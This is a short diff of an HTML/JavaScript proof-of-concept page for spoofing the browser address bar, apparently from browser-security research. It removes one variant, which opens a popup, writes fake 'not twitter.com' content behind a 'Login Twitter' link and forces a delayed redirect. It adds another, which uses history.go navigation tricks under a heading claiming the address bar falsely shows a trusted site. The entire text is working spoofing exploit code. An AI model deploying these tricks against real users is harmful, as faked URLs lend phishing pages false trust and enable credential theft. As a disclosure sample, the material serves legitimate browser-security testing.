@@ -1,15 +1,6 @@
-
+<h1>Address bar says https://xisigr.com - this is NOT https://xisigr.com</h1>
+<button onclick="alert(document.domain)">haaaaa</button>
 <script>
-  function next() {
-         w.location.replace('https://www.google.com:1234');
-        }
-
-  function f() {
-    w = window.open("");
-    w.document.write('<h2>This is not twitter.com!</h2>');
-    w.location = "https://amazon.com";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
+window.history.go(1);
+window.history.go(-1);
 </script>
-
-<a href="#" onclick="f()">Login Twitter</a>
